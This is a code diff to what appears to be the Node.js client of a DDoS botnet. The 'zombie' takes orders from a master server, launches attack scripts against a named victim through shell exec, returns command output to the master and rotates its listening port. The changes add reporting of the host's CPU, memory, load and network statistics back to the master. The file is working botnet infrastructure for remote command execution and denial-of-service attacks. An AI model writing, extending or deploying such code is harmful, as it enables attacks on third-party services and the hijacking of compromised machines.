@@ -8,6 +8,8 @@ const axios = require('axios');
 const EventEmitter = require('events')
 const moment = require('moment')
 const delay = require('delay')
+const si = require('systeminformation');
+
 let master = null
 var masterReachable = new EventEmitter()
 var settingIntegrity = new EventEmitter()
@@ -25,7 +27,26 @@ let zombie = {
     },
     init: Date.now(),
     busy: false,
-    installedScripts: []
+    installedScripts: [],
+    systemInfo: {
+        static: null,
+        dynamic: {
+            cpu: {
+                brand: null,
+                speed: null,
+                voltage: null
+            },
+            mem: {
+                total: null,
+                free: null,
+                used: null,
+                active: null,
+                available: null
+            },
+            load: null,
+            net: null
+        }
+    }
 }
 
 function checkLocalMaster() {
@@ -131,7 +152,7 @@ settingIntegrity.on('true', () => {
                             res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                         } else {
                             console.log("DOES NOT exist:", methodfilename);
-                            res.send(500, { error: {code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine.${methodfilename}` } })
+                            res.send(500, { error: { code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine.${methodfilename}` } })
                         }
                     })
                     .catch(err => {
@@ -157,12 +178,12 @@ settingIntegrity.on('true', () => {
             if (err) {
                 //some err occurred
                 console.error(err)
-                res.send(200, {std_err: err})
+                res.send(200, { std_err: err })
             } else {
                 // the *entire* stdout and stderr (buffered)
                 console.log(`stdout: ${stdout}`);
                 console.log(`stderr: ${stderr}`);
-                res.send(200, {std_out: stdout, std_err: stderr})
+                res.send(200, { std_out: stdout, std_err: stderr })
             }
         })
     })
@@ -223,35 +244,15 @@ settingIntegrity.on('true', () => {
     })
     htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
 
-    function checkSelf() {
-        axios.get("http://" + master + "/globals")
-            .then(res => {
-                if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
-                    console.log(res.data.port.changeAt < Date.now());
-                    console.log(res.data.port.last === zombie.port);
-                    zombie.port = res.data.port.number
-                    htserver.close()
-                    htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
-                    console.log(res.data);
-                }
-            })
-            .catch(err => {
-                console.error(err);
-            })
-    }
-
-    checkSelf();
-
-    setInterval(function () {
-        checkSelf()
-        console.log(zombie.port);
-    }, 6000)
+    si.getStaticData(function (data) {
+        zombie.systemInfo.static = data
+    })
 });
 
 async function startAttack(methodData, victim, time) {
     let command = (methodData.dictation).replace("$VICTIM", `http://${victim}`)
     console.log(command);
-        exec(command, (err, stdout, stderr) => {
+    exec(command, (err, stdout, stderr) => {
         if (err) {
             //some err occurred
             console.log(err)
@@ -261,7 +262,7 @@ async function startAttack(methodData, victim, time) {
             console.log(`stderr: ${stderr}`);
         }
     });
-    await delay (time * 1000)
+    await delay(time * 1000)
     zombie.currentAttack = {
         victim: null,
         doneby: null,
@@ -269,7 +270,7 @@ async function startAttack(methodData, victim, time) {
         timer: null,
         method: null
     },
-    zombie.busy = false
+        zombie.busy = false
     exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
         if (err) {
             //some err occurred
@@ -283,10 +284,17 @@ async function startAttack(methodData, victim, time) {
 
 }
 
-async function heartbeat(){
-    axios.get("http://" + master + "/heartbeat")
+async function heartbeat() {
+    axios.post("http://" + master + "/heartbeat", {machine: zombie})
         .then(res => {
-            SCRIPTS = res.data
+            if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
+                console.log(res.data.port.changeAt < Date.now());
+                console.log(res.data.port.last === zombie.port);
+                zombie.port = res.data.port.number
+                htserver.close()
+                htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
+                console.log(res.data);
+            }
         })
         .catch(err => {
             console.error(err);
@@ -295,9 +303,43 @@ async function heartbeat(){
 
 heartbeat();
 
-setInterval(function(){
+setInterval(function () {
     heartbeat()
 }, 5000)
+
+setInterval(() => {
+    siDataPlacement()
+}, 10000);
+
+si.getDynamicData(function (data) {
+    zombie.systemInfo.dynamic.all = data
+})
+setInterval(() => {
+    si.getDynamicData(function (data) {
+        zombie.systemInfo.dynamic.all = data
+    })
+}, 30000);
+
+async function siDataPlacement() {
+    si.cpu(function (cpudata) {
+        zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
+        zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
+        zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
+    })
+    si.mem(function (memdata) {
+        zombie.systemInfo.dynamic.mem.total = memdata.total
+        zombie.systemInfo.dynamic.mem.free = memdata.free
+        zombie.systemInfo.dynamic.mem.used = memdata.used
+        zombie.systemInfo.dynamic.mem.active = memdata.active
+        zombie.systemInfo.dynamic.mem.available = memdata.available
+    })
+    si.currentLoad(function (data) {
+        zombie.systemInfo.dynamic.load = data
+    })
+    si.networkStats(function (data) {
+        zombie.systemInfo.dynamic.net = data
+    })
+}
 
 /*
 
@@ -327,3 +369,4 @@ if ((process.argv.slice(2))[0] === "setup") {
 } else {
     console.log("action")
 }*/
+
